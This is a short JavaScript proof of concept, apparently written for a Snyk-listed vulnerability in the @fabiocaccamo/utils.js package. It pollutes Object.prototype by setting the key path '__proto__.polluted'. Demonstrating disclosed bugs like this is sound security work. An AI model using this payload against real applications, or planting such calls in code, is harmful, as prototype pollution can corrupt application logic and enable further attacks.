//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
 
  const utils = require("@fabiocaccamo/utils.js");
  const obj = {};

   

  utils.object.keypath.set(obj, "__proto__.polluted", "yes");
// End of file
